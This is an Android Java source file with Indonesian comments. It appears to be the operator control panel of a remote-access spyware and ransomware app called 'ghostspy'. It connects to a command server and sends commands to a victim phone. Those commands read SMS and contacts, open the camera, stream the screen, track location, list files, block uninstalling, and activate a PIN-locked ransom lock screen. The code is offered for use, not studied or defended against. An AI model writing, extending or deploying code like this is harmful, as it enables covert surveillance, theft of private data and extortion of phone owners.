package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import android.view.animation.AlphaAnimation;
import android.view.animation.ScaleAnimation;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class ControlActivity extends Activity {
    private Socket socket;
    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        deviceId = getIntent().getStringExtra("deviceId");
        String model = getIntent().getStringExtra("deviceModel");
        String battery = getIntent().getStringExtra("battery");

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF090909);

        ScrollView scroll = new ScrollView(this);
        scroll.setFillViewport(true);

        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setPadding(0, 0, 0, 32);

        // Header
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);
        header.setBackgroundColor(0xFF171717);
        header.setPadding(16, 12, 16, 12);

        Button backBtn = new Button(this);
        backBtn.setText("←");
        backBtn.setTextColor(0xFFFFFFFF);
        backBtn.setBackgroundColor(0x00000000);
        backBtn.setOnClickListener(v -> finish());
        header.addView(backBtn);

        TextView info = new TextView(this);
        info.setText(model + " | Bat: " + battery + "%");
        info.setTextColor(0xFFFFFFFF);
        info.setPadding(12, 6, 12, 6);
        info.setBackgroundColor(0xFF171717);
        LinearLayout.LayoutParams infoParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        info.setLayoutParams(infoParams);
        info.setGravity(Gravity.CENTER);
        header.addView(info);

        TextView notif = new TextView(this);
        notif.setText("2");
        notif.setTextColor(0xFFFFFFFF);
        notif.setBackground(getDrawable(R.drawable.btn_admin));
        notif.setPadding(10, 4, 10, 4);
        header.addView(notif);
        content.addView(header);

        // Device Actions
        TextView actionTitle = new TextView(this);
        actionTitle.setText("Device Actions");
        actionTitle.setTextColor(0xFF00E676);
        actionTitle.setTextSize(14);
        actionTitle.setTypeface(null, android.graphics.Typeface.BOLD);
        actionTitle.setPadding(16, 16, 16, 8);
        content.addView(actionTitle);

        LinearLayout actionRow1 = new LinearLayout(this);
        actionRow1.setOrientation(LinearLayout.HORIZONTAL);
        actionRow1.setGravity(Gravity.CENTER);
        actionRow1.setPadding(12, 0, 12, 8);

        Button lockBtn = createActionButton("Lock", "🔒", "#FF1744", v -> showLockScreenDialog());
        actionRow1.addView(lockBtn);

        Button unlockBtn = createActionButton("Unlock", "🔓", "#00E676", v -> sendCmd("unlock"));
        actionRow1.addView(unlockBtn);
        content.addView(actionRow1);

        LinearLayout actionRow2 = new LinearLayout(this);
        actionRow2.setOrientation(LinearLayout.HORIZONTAL);
        actionRow2.setGravity(Gravity.CENTER);
        actionRow2.setPadding(12, 0, 12, 8);

        Button antiBtn = createActionButton("Anti-Uninstall", "🛡️", "#2196F3", v -> showAntiUninstallDialog());
        actionRow2.addView(antiBtn);

        Button toolsBtn = createActionButton("Tools", "⚙️", "#9C27B0", v -> showToolsDialog());
        actionRow2.addView(toolsBtn);
        content.addView(actionRow2);

        // Feature Grid (ubah Apps, Network, Notify)
        TextView gridTitle = new TextView(this);
        gridTitle.setText("Feature Menu");
        gridTitle.setTextColor(0xFF00E676);
        gridTitle.setTextSize(14);
        gridTitle.setTypeface(null, android.graphics.Typeface.BOLD);
        gridTitle.setPadding(16, 16, 16, 8);
        content.addView(gridTitle);

        LinearLayout grid = new LinearLayout(this);
        grid.setOrientation(LinearLayout.VERTICAL);
        grid.setPadding(12, 0, 12, 12);

        String[][] items = {
            {"Camera", "#FF1744", "start_camera"},
            {"SMS", "#FF4D8D", "get_sms"},
            {"Contacts", "#00E676", "get_contacts"},
            {"Playsound", "#FFC107", "playmusic"},
            {"Live Screen", "#2ED8FF", "live_screen"},
            {"Spam Flash", "#2196F3", "spam_flashlight"},
            {"Play Video", "#9C27B0", "play_video"},
            {"Tracking", "#FF9800", "tracking"},
            {"WiFi Scan", "#00BCD4", "wifiscan"},
            {"Files", "#FF5722", "list_files"},
            {"Cell Tower", "#607D8B", "celltower"},
            {"WiFi Hist", "#3F51B5", "wifihistory"},
            {"Wallpaper", "#E91E63", "wallpaper"}
        };

        LinearLayout row = null;
        for (int i = 0; i < items.length; i++) {
            if (i % 3 == 0) {
                row = new LinearLayout(this);
                row.setOrientation(LinearLayout.HORIZONTAL);
                grid.addView(row);
            }
            row.addView(createGridCard(items[i][0], items[i][1], items[i][2]));
        }
        content.addView(grid);

        // Control Center
        TextView controlCenter = new TextView(this);
        controlCenter.setText("Control Center");
        controlCenter.setTextColor(0xFFFFFFFF);
        controlCenter.setBackground(getDrawable(R.drawable.card_admin));
        controlCenter.setPadding(16, 12, 16, 12);
        controlCenter.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams ccParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        ccParams.setMargins(16, 0, 16, 0);
        controlCenter.setLayoutParams(ccParams);
        controlCenter.setOnClickListener(v -> showControlPopup());
        content.addView(controlCenter);

        scroll.addView(content);
        root.addView(scroll);
        setContentView(root);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {}
    }

    private Button createActionButton(String text, String icon, String color, android.view.View.OnClickListener listener) {
        Button btn = new Button(this);
        btn.setText(icon + " " + text);
        btn.setTextColor(0xFFFFFFFF);
        btn.setBackgroundColor((int) Long.parseLong(color.substring(1), 16));
        btn.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 56, 1);
        p.setMargins(6, 0, 6, 0);
        btn.setLayoutParams(p);
        btn.setOnClickListener(listener);
        return btn;
    }

    private LinearLayout createGridCard(String label, String color, String cmd) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER);
        card.setBackgroundColor((int) Long.parseLong(color.substring(1), 16) | 0x22000000);
        card.setPadding(4, 12, 4, 12);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 100, 1);
        p.setMargins(4, 4, 4, 4);
        card.setLayoutParams(p);

        TextView icon = new TextView(this);
        icon.setText(getIconForCmd(cmd));
        icon.setTextColor(0xFFFFFFFF);
        icon.setTextSize(20);
        icon.setGravity(Gravity.CENTER);

        TextView lbl = new TextView(this);
        lbl.setText(label);
        lbl.setTextColor(0xFFCCCCCC);
        lbl.setTextSize(10);
        lbl.setGravity(Gravity.CENTER);
        lbl.setPadding(0, 4, 0, 0);

        card.addView(icon);
        card.addView(lbl);

        card.setOnClickListener(v -> {
            ScaleAnimation scale = new ScaleAnimation(1f, 0.9f, 1f, 0.9f,
                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f,
                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f);
            scale.setDuration(120);
            scale.setRepeatCount(0);
            v.startAnimation(scale);
            handleAction(cmd);
        });
        return card;
    }

    private String getIconForCmd(String cmd) {
        switch (cmd) {
            case "start_camera": return "📷";
            case "get_sms": return "💬";
            case "get_contacts": return "👥";
            case "playmusic": return "🎵";
            case "live_screen": return "🖥";
            case "spam_flashlight": return "🔦";
            case "play_video": return "🎬";
            case "tracking": return "📍";
            case "wifiscan": return "📶";
            case "list_files": return "📁";
            case "celltower": return "📡";
            case "wifihistory": return "🕒";
            case "wallpaper": return "🖼️";
            default: return "•";
        }
    }

    private void handleAction(String cmd) {
        Intent i = null;
        switch (cmd) {
            case "start_camera": i = new Intent(this, CameraActivity.class); break;
            case "get_sms": i = new Intent(this, SmsActivity.class); break;
            case "get_contacts": i = new Intent(this, ContactsActivity.class); break;
            case "playmusic": showPlaysoundDialog(); return;
            case "wallpaper": showWallpaperDialog(); return;
            case "toast": showToastDialog(); return;
            case "openurl": showOpenUrlDialog(); return;
            case "live_screen": i = new Intent(this, LiveScreenActivity.class); break;
            case "list_files": i = new Intent(this, FileManagerActivity.class); break;
            case "spam_flashlight": showSpamFlashlightDialog(); return;
            case "play_video": showPlayVideoDialog(); return;
            case "tracking": i = new Intent(this, TrackingActivity.class); break;
        }
        if (i != null) {
            i.putExtra("deviceId", deviceId);
            startActivity(i);
        }
    }

    // ========== SPAM FLASHLIGHT DIALOG ==========
    private void showSpamFlashlightDialog() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("🔦 Spam Flashlight");
        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        lay.setPadding(24, 16, 24, 16);

        EditText durInput = new EditText(this);
        durInput.setHint("Durasi (ms)");
        durInput.setTextColor(0xFFFFFFFF);
        durInput.setBackgroundColor(0xFF252525);
        durInput.setPadding(16, 12, 16, 12);
        lay.addView(durInput);

        Button runBtn = new Button(this);
        runBtn.setText("Spam");
        runBtn.setTextColor(0xFFFFFFFF);
        runBtn.setBackgroundColor(0xFF00E676);
        runBtn.setOnClickListener(v -> {
            String dur = durInput.getText().toString().trim();
            if (!dur.isEmpty()) {
                try {
                    int d = Integer.parseInt(dur);
                    sendCmd("flashlight_spam", new JSONObject().put("duration", d));
                } catch (Exception e) {}
            }
        });
        lay.addView(runBtn);

        b.setView(lay);
        b.setNegativeButton("Tutup", null);
        b.show();
    }

    // ========== PLAY VIDEO DIALOG ==========
    private void showPlayVideoDialog() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("🎬 Play Video via URL");
        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        lay.setPadding(24, 16, 24, 16);

        EditText urlInput = new EditText(this);
        urlInput.setHint("URL video (mp4)");
        urlInput.setTextColor(0xFFFFFFFF);
        urlInput.setBackgroundColor(0xFF252525);
        urlInput.setPadding(16, 12, 16, 12);
        lay.addView(urlInput);

        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);
        btnRow.setGravity(Gravity.CENTER);

        Button runBtn = new Button(this);
        runBtn.setText("▶ Run");
        runBtn.setTextColor(0xFFFFFFFF);
        runBtn.setBackgroundColor(0xFF00E676);
        runBtn.setOnClickListener(v -> {
            String url = urlInput.getText().toString().trim();
            if (!url.isEmpty()) {
                sendCmd("openurl", new JSONObject() {{ try { put("url", url); } catch (Exception e) {} }});
                Toast.makeText(this, "Video diputar", Toast.LENGTH_SHORT).show();
            }
        });
        btnRow.addView(runBtn);

        Button offBtn = new Button(this);
        offBtn.setText("⏹ Off");
        offBtn.setTextColor(0xFFFFFFFF);
        offBtn.setBackgroundColor(0xFFFF1744);
        offBtn.setOnClickListener(v -> {
            sendCmd("stopmusic"); // asumsikan stop media
            Toast.makeText(this, "Video dihentikan", Toast.LENGTH_SHORT).show();
        });
        btnRow.addView(offBtn);

        lay.addView(btnRow);
        b.setView(lay);
        b.setNegativeButton("Tutup", null);
        b.show();
    }

    // ========== LOCK SCREEN DIALOG DENGAN SCROLLVIEW ==========
    private void showLockScreenDialog() {
        Dialog dialog = new Dialog(this, android.R.style.Theme_Black_NoTitleBar_Fullscreen);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE);

        ScrollView scroll = new ScrollView(this);
        LinearLayout container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setBackground(getDrawable(R.drawable.card_admin));
        container.setPadding(24, 24, 24, 24);
        int margin = 32;
        LinearLayout.LayoutParams rootParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        rootParams.setMargins(margin, margin*2, margin, margin*2);
        container.setLayoutParams(rootParams);

        TextView title = new TextView(this);
        title.setText("Custom Lock Screen");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(20);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        container.addView(title);

        EditText htmlEditor = new EditText(this);
        htmlEditor.setHint("<h1>HP TERKUNCI</h1>");
        htmlEditor.setTextColor(0xFFFFFFFF);
        htmlEditor.setBackgroundColor(0xFF252525);
        htmlEditor.setPadding(16, 12, 16, 12);
        htmlEditor.setMinLines(5);
        htmlEditor.setGravity(Gravity.TOP);
        container.addView(htmlEditor);

        WebView preview = new WebView(this);
        preview.setWebViewClient(new WebViewClient());
        preview.getSettings().setJavaScriptEnabled(false);
        preview.setBackgroundColor(0xFF000000);
        LinearLayout.LayoutParams webParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 220);
        webParams.setMargins(0, 8, 0, 12);
        preview.setLayoutParams(webParams);
        container.addView(preview);

        htmlEditor.addTextChangedListener(new android.text.TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
            @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
            @Override public void afterTextChanged(android.text.Editable s) {
                preview.loadDataWithBaseURL(null, s.toString(), "text/html", "UTF-8", null);
            }
        });

        EditText pinInput = new EditText(this);
        pinInput.setHint("PIN (4-6 digit)");
        pinInput.setTextColor(0xFFFFFFFF);
        pinInput.setBackgroundColor(0xFF252525);
        pinInput.setPadding(16, 12, 16, 12);
        container.addView(pinInput);

        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);
        btnRow.setGravity(Gravity.CENTER);
        btnRow.setPadding(0, 16, 0, 0);

        Button jalankanBtn = new Button(this);
        jalankanBtn.setText("Jalankan");
        jalankanBtn.setTextColor(0xFFFFFFFF);
        jalankanBtn.setBackgroundColor(0xFF00E676);
        jalankanBtn.setOnClickListener(v -> {
            String html = htmlEditor.getText().toString().trim();
            String pin = pinInput.getText().toString().trim();
            if (html.isEmpty() || pin.isEmpty()) {
                Toast.makeText(this, "HTML & PIN harus diisi", Toast.LENGTH_SHORT).show();
                return;
            }
            try {
                sendCmd("ransomware_activate", new JSONObject().put("html", html).put("pin", pin));
            } catch (Exception e) {}
            dialog.dismiss();
        });
        btnRow.addView(jalankanBtn);

        Button matikanBtn = new Button(this);
        matikanBtn.setText("Matikan");
        matikanBtn.setTextColor(0xFFFFFFFF);
        matikanBtn.setBackgroundColor(0xFFFF1744);
        matikanBtn.setOnClickListener(v -> {
            sendCmd("ransomware_deactivate");
            dialog.dismiss();
        });
        btnRow.addView(matikanBtn);
        container.addView(btnRow);

        Button tutupBtn = new Button(this);
        tutupBtn.setText("Tutup");
        tutupBtn.setTextColor(0xFF9AA3B2);
        tutupBtn.setBackgroundColor(0x00000000);
        tutupBtn.setOnClickListener(v -> dialog.dismiss());
        container.addView(tutupBtn);

        scroll.addView(container);
        dialog.setContentView(scroll);
        dialog.show();

        AlphaAnimation fadeIn = new AlphaAnimation(0f, 1f);
        fadeIn.setDuration(250);
        container.startAnimation(fadeIn);
    }

    // ========== DIALOG LAIN TETAP SAMA (showPlaysoundDialog, dll.) ==========
    // ... (salin dari versi sebelumnya, tidak diubah)
    // Untuk menghemat tempat, master bisa salin dari file sebelumnya yang sudah lengkap.
}
